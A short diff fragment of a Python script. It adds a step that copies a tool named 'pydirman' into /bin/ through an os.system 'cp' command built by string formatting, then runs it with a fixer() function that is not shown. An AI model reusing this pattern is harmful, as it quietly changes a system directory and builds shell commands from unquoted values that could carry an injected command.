@@ -19,3 +19,10 @@ def fixer(cmd):
 for doc in docs:
     fixer(doc)
 
+if 'pydirman' in os.listdir('/bin/'):
+    pass
+else:
+    os.system('cp {}/{} /bin/'.format(PATH, 'pydirman'))
+   
+os.chdir('/bin/')
+fixer('pydirman')
